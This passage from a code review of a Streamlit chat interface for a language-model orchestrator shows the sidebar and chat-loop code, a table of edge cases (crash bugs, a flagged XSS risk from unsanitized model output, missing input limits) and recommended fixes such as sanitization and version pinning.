            letter-spacing: 0.1em;
            margin-bottom: 1.5rem;
            padding-bottom: 0.75rem;
            border-bottom: 1px solid var(--void-elevated);
        ">TELEMETRY</div>
        """, unsafe_allow_html=True)

        # Budget gauge
        acc = float(state_mgr.state.accumulated_cost)
        limit = 5.0
        pct = min((acc / limit) * 100, 100)
        bar_color = "var(--danger)" if pct > 80 else "var(--amber)"

        st.markdown(f"""
        <div style="margin-bottom: 1.5rem;">
            <div style="
                display: flex; justify-content: space-between;
                font-family: var(--mono); font-size: 0.6rem; 
                color: var(--ash); margin-bottom: 0.4rem;
            ">
                <span>BUDGET</span>
                <span>{pct:.1f}%</span>
            </div>
            <div style="
                height: 3px; background: var(--void-elevated); 
                width: 100%; border-radius: 1px; overflow: hidden;
            ">
                <div style="
                    height: 100%; width: {pct}%; 
                    background: {bar_color};
                    transition: width 0.4s ease;
                "></div>
            </div>
            <div style="
                font-family: var(--mono); 
                color: {bar_color}; 
                font-size: 1.3rem; 
                margin-top: 0.5rem;
            ">
                ${acc:.4f}
                <span style="font-size: 0.6rem; color: var(--ash);">/ ${limit:.2f}</span>
            </div>
        </div>
        """, unsafe_allow_html=True)

        st.divider()

        # Model selector
        st.markdown("""
        <div style="
            font-family: var(--mono); font-size: 0.6rem; 
            color: var(--ash); letter-spacing: 0.08em;
            margin-bottom: 0.5rem;
        ">MODEL</div>
        """, unsafe_allow_html=True)

        if "available_models" not in st.session_state:
            with st.spinner("Loading models..."):
                try:
                    models = run_async(orchestrator.load_models())
                    st.session_state.available_models = [
                        (m.id, m.name) for m in models[:25]
                    ]
                except Exception as e:
                    st.error(f"Failed to load models: {e}")
                    st.session_state.available_models = [
                        ("openai/gpt-3.5-turbo", "GPT-3.5 Turbo"),
                        ("openai/gpt-4", "GPT-4"),
                    ]

        selected = st.selectbox(
            "Model",
            options=[m[0] for m in st.session_state.available_models],
            format_func=lambda x: next(
                (m[1] for m in st.session_state.available_models if m[0] == x), x
            ),
            key="model_selector",
            label_visibility="collapsed",
        )
        if selected != state_mgr.state.selected_model:
            state_mgr.update(selected_model=selected)

        st.divider()

        # Conversation archive
        st.markdown("""
        <div style="
            font-family: var(--mono); font-size: 0.6rem; 
            color: var(--ash); letter-spacing: 0.08em;
            margin-bottom: 0.5rem;
        ">ARCHIVE</div>
        """, unsafe_allow_html=True)

        if st.button("＋ NEW SESSION", use_container_width=True):
            conv = run_async(orchestrator.create_conversation(
                title=f"Session_{datetime.now().strftime('%y%m%d_%H%M%S')}",
                model_id=state_mgr.state.selected_model,
                system_prompt="You are a precise, technical assistant. Respond concisely.",
            ))
            state_mgr.update(current_conversation_id=str(conv.id))
            st.session_state.messages = []
            st.rerun()

        repo = SQLiteConversationRepository()
        convs = repo.list_active(limit=10)
        for conv in convs:
            label = conv.title or str(conv.id)[:8]
            is_active = state_mgr.state.current_conversation_id == str(conv.id)
            if st.button(
                f"{'▸ ' if is_active else '  '}{label}",
                key=f"conv_{conv.id}",
                use_container_width=True,
                disabled=is_active,
            ):
                state_mgr.update(current_conversation_id=str(conv.id))
                # Load messages from DB
                st.session_state.messages = repo.get_messages(conv.id)
                st.rerun()

    # ─── Main Canvas ─────────────────────────────────
    conv_id = state_mgr.state.current_conversation_id

    if not conv_id:
        render_empty_state()
        return

    # Initialize message list
    if "messages" not in st.session_state:
        repo = SQLiteConversationRepository()
        st.session_state.messages = repo.get_messages(UUID(conv_id))

    # Render history
    for msg in st.session_state.messages:
        if msg.role == MessageRole.SYSTEM:
            continue  # Don't render system prompts
        render_message(
            role=msg.role,
            content=msg.content,
            cost=msg.cost,
            latency=msg.latency_ms,
        )

    # Input
    user_input = st.chat_input(
        placeholder="Enter transmission...",
        key="user_input",
    )

    if user_input:
        # Show user message immediately
        render_message(role="user", content=user_input)

        # Stream response
        response_container = st.empty()
        full_response = ""

        try:
            stream = orchestrator.send_message(
                conversation_id=UUID(conv_id),
                content=user_input,
            )

            async def consume_stream():
                nonlocal full_response
                chunks = []
                metadata = None
                async for delta, meta in stream:
                    if delta:
                        full_response += delta
                        chunks.append(delta)
                    if meta:
                        metadata = meta
                return full_response, metadata

            # Render with streaming effect
            with response_container.container():
                result_text, meta = run_async(consume_stream())

                render_message(
                    role="assistant",
                    content=result_text,
                    cost=meta.get("cost") if meta else None,
                    latency=meta.get("latency") if meta else None,
                )

            # Update cost
            state_mgr.update(
                accumulated_cost=str(cost_tracker.accumulated_cost)
            )

            st.rerun()

        except Exception as e:
            st.error(f"⚠ TRANSMISSION FAILURE: {e}")


if __name__ == "__main__":
    main()
```

---

## 8. Edge Case Analysis — Summary Matrix

| Edge Case | Current Plan | Status | Fix Required |
|---|---|---|---|
| SQLite `PRAGMA foreign_keys` never enabled | Event listener targets wrong object | 🔴 Broken | Defect C-2 fix |
| `TokenUsage.cost` called as property with args | `TypeError` at runtime | 🔴 Crash | Defect C-1 fix |
| Streaming via circuit breaker | `await` on `AsyncGenerator` | 🔴 Crash | Defect C-4 fix |
| Repository session leak | Context manager never closed | 🔴 Leak | Defect C-3 fix |
| Budget events emitted to void | New `EventBus()` per emission | 🔴 Silent fail | Defect C-6 fix |
| XSS via unsanitized LLM output | `content` injected raw into HTML | 🔴 Security | Vuln S-1 fix |
| `Conversation.to_dict()` doesn't exist | `AttributeError` on state save | 🔴 Crash | Issue H-4 fix |
| No `get_messages` repository method | History always empty | 🟡 Logic error | Defect C-3 fix |
| `asyncio.run()` inside Streamlit loop | `RuntimeError` on some deployments | 🟡 Intermittent | Issue H-3 fix |
| Circuit breaker not thread-safe | Race conditions under concurrent sessions | 🟡 Race condition | Issue H-2 fix |
| CSS Grid on internal Streamlit DOM | Breaks on minor version updates | 🟡 Fragile | Pitfall ST-1 |
| Font re-import on every rerun | FOUT + latency | 🟡 UX degradation | Pitfall ST-3 |
| Complex objects in `session_state` | Potential serialization failures | 🟡 Intermittent | Pitfall ST-2 |
| No input length validation | Megabyte payloads to OpenRouter | 🟡 Cost/DoS risk | Vuln S-2 |
| UUID type in SQLite | Works via conversion but fragile | 🟢 Low risk | Issue H-6 |
| `Space Grotesk` in design tokens | Contradicts own anti-generic guidelines | 🟢 Aesthetic | Section 6 |
| `Conversation.update_cost` uses `object.__setattr__` | Misleading, non-frozen dataclass | 🟢 Readability | Issue H-1 |

---

## 9. Final Verdict

**The architecture is strong. The implementation has 7 runtime-crashing bugs.**

The Clean Architecture layering, event-driven cost tracking, and circuit breaker pattern are correctly applied at the design level. But the code was never executed — every defect listed above would surface within the first 3 minutes of testing.

**Recommended action:**
1. Apply all Critical (C-1 through C-7) fixes before any further development
2. Adopt `@st.cache_resource` for service singletons (Pitfall ST-2)
3. Replace the CSS Grid hijack with the hybrid `st.columns` + injected HTML approach (Pitfall ST-1)
4. Add Bleach sanitization to every `unsafe_allow_html=True` path (Vuln S-1)
5. Pin `streamlit==1.28.2` and add a visual smoke test to CI

The bones are excellent. The flesh needs surgery.
